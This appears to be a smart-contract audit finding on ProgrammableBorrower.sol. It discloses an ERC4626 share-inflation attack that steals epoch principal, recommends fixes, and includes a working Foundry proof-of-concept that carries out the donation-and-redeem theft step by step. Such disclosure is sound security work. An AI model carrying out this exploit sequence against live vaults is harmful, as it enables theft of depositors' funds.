### Title
ERC4626 share inflation lets the first external vault depositor steal epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits the entire credit facility into an arbitrary ERC4626 vault without enforcing a minimum share amount or validating the post-deposit redeemable value. If the configured vault has zero or economically negligible share supply, an ordinary vault depositor can perform the standard first-depositor/share-inflation sequence and cause the facility’s deposit to mint zero or near-zero shares. The attacker can then redeem their shares for both their seed liquidity and the facility’s principal.

### Finding Description
Initialization only verifies that the external vault uses the same underlying asset, then grants that vault unlimited underlying allowance; it does not require existing vault supply, locked liquidity, or an allowlisted implementation. [1](#0-0)   
A later vault replacement has the same asset-only validation and checks only that the old vault position is empty. [2](#0-1) 

At epoch start, the adapter snapshots the facility’s full pre-deposit balance and then deposits all of its idle underlying into the configured vault. [3](#0-2)   
`_depositToVault` accepts whatever share amount the external vault returns and performs no `shares != 0`, slippage, or post-deposit value check. [4](#0-3) 

For example, with a public ERC4626 vault whose `deposit` mints `assets * totalSupply / totalAssets`:

1. The vault is empty when the facility is configured.
2. An attacker deposits 1 underlying unit and receives 1 share.
3. The attacker directly transfers `P` underlying units to the vault, where `P` is at least the facility deposit.
4. The honest epoch-start sequence sends `P` principal to `ProgrammableBorrower` and calls `onStartEpoch`.
5. The adapter deposits `P`, but the inflated vault price mints `P * 1 / (P + 1) == 0` shares to the adapter.
6. The attacker redeems their single share for `2P + 1`, recovering their `P` donation and stealing the pool’s `P` principal.

The adapter subsequently values its position through `vault.convertToAssets`, so a zero-share position produces zero recoverable assets. [5](#0-4)   
Because `epochStartVaultAssets` remains the full pre-deposit principal, epoch accounting reports the stolen amount as vault loss and floors pool-facing interest at zero rather than preserving any recoverable claim. [6](#0-5) 

### Impact Explanation
An unprivileged depositor in the configured ERC4626 vault can steal all or substantially all of the principal sent to the programmable borrower at epoch start. For a `P`-unit deposit and a `P`-unit donation, the attacker’s net profit is approximately `P` underlying units after redeeming their inflated share.

The broken invariant is fair external-vault conversion: one deposited unit of pool principal must produce economically equivalent vault shares. The CDO’s tranche NAV remains backed by strategy-token accounting while the programmable borrower has no corresponding ERC4626 position, creating an immediate insolvency equal to the stolen principal and causing later withdrawals to be unpaid or forcing default handling.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have zero or sufficiently low share supply relative to attacker-controlled vault assets before `ProgrammableBorrower` deposits. That condition is realistic when onboarding or switching to a newly deployed vault, because the code permits any ERC4626 vault with a matching asset and does not require a minimum existing supply. [7](#0-6) 

The attack does not require a malicious privileged role, borrower, manager, reentrancy, an oracle failure, or a malicious ERC4626 implementation. The attacker only uses ordinary vault `deposit`, direct asset transfer, and `redeem` functions. Existing `nonReentrant` and `onlyIdleCDO` checks do not prevent the economic manipulation because the vault interaction itself is legitimate.

### Recommendation
Require a safe minimum share output for every external vault deposit. `_depositToVault` should reject both zero-share deposits and deposits whose immediately redeemable value falls outside an operator-specified or protocol-enforced tolerance.

Additionally:

- Only configure audited ERC4626 vaults with meaningful existing supply or permanently locked seed liquidity.
- During initialization or `setVault`, require a minimum total supply and liquidity threshold, or perform an initial protected seed deposit.
- Pass an explicit `minShares`/`minAssetsOut` parameter through the epoch-start configuration rather than relying on an externally manipulable vault price.
- Revert if `vault.convertToAssets(shares)` differs from `_assetAmount` by more than an explicit rounding/fee tolerance.
- Prefer atomically migrating positions during vault changes so an attacker cannot seed a low-liquidity vault between configuration and funding.

### Proof of Concept
The following Foundry test forks mainnet for the real USDC contract and uses a minimal, non-malicious ERC4626-style vault whose public deposit flow permits first-depositor inflation. It simulates the honest CDO funding and epoch-start hook while the attacker uses only public vault calls.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
    "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ShareInflationVault is ERC20 {
    IERC20 public immutable assetToken;

    constructor(address _asset) ERC20("Inflation Vault", "INF") {
        assetToken = IERC20(_asset);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 managed = assetToken.balanceOf(address(this));
        shares = assets * supply / managed;
        if (shares * managed < assets * supply) shares += 1;

        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract FakeIdleCDO {
    address public immutable token;
    ProgrammableBorrower public immutable programmableBorrower;

    constructor(address _token, address _programmableBorrower) {
        token = _token;
        programmableBorrower = ProgrammableBorrower(_programmableBorrower);
    }

    function fundEpoch(uint256 amount) external {
        IERC20(token).transfer(address(programmableBorrower), amount);
        programmableBorrower.onStartEpoch(0);
    }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
    address internal constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant POOL_PRINCIPAL = 10_000_000e6;

    function test_FirstVaultDepositorStealsEpochPrincipal() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        ShareInflationVault vault = new ShareInflationVault(USDC);

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        ProgrammableBorrower programmableBorrower = ProgrammableBorrower(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    address(this),
                    ""
                )
            )
        );

        FakeIdleCDO cdo =
            new FakeIdleCDO(USDC, address(programmableBorrower));

        programmableBorrower.initialize(
            address(vault),
            address(cdo),
            address(this),
            makeAddr("manager"),
            makeAddr("borrower"),
            0
        );

        address attacker = makeAddr("attacker");
        uint256 attackerStart = POOL_PRINCIPAL + 1;
        deal(USDC, attacker, attackerStart);
        deal(USDC, address(cdo), POOL_PRINCIPAL);

        vm.startPrank(attacker);
        IERC20(USDC).approve(address(vault), type(uint256).max);

        // Seed one share and inflate its price to POOL_PRINCIPAL + 1 assets.
        vault.deposit(1, attacker);
        IERC20(USDC).transfer(address(vault), POOL_PRINCIPAL);
        vm.stopPrank();

        // Honest epoch start: the CDO sends principal and invokes the hook.
        cdo.fundEpoch(POOL_PRINCIPAL);

        assertEq(
            programmableBorrower.vaultSharesBalance(),
            0,
            "facility deposit minted zero vault shares"
        );
        assertEq(
            programmableBorrower.totalUnderlying(),
            0,
            "facility has no recoverable underlying"
        );
        assertEq(
            programmableBorrower.totalInterestDueNow(),
            0,
            "theft is floored as vault loss"
        );

        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(
            IERC20(USDC).balanceOf(attacker),
            attackerStart + POOL_PRINCIPAL,
            "attacker recovered donation and stole facility principal"
        );
    }
}
```

  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
